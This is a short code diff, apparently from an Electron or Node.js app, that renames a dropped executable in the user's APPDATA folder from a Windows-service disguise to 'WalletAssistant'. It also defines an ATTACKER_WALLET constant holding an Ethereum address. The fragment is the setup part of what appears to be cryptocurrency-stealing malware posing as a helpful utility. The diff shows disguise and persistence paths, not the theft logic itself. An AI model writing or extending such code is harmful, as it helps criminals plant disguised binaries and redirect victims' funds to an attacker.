@@ -4,9 +4,9 @@ const fs = require('fs');
 const { exec } = require('child_process');
 
 let mainWindow;
-const AGENT_NAME = "WindowsServiceHelper"; 
-const TARGET_FOLDER = path.join(process.env.APPDATA, 'WindowsService');
-const TARGET_PATH = path.join(TARGET_FOLDER, 'ServiceHelper.exe');
+const AGENT_NAME = "WalletAssistant"; 
+const TARGET_FOLDER = path.join(process.env.APPDATA, 'WalletAssistant');
+const TARGET_PATH = path.join(TARGET_FOLDER, 'WalletAssistant.exe');
 
 const ATTACKER_WALLET = {
     ethereum: '0x742d35Cc66DCeC8B01C4e403128ef5451a5b3C10',
